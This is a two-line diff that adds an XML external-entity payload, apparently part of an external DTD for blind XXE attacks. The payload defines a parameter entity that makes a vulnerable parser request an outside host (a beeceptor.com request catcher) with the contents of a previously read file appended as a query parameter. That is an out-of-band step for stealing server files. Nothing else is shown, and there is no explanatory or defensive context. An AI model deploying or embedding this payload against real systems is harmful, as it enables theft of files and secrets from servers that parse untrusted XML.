@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://poilu.free.beeceptor.com?collect=%file;'>">
+%all;
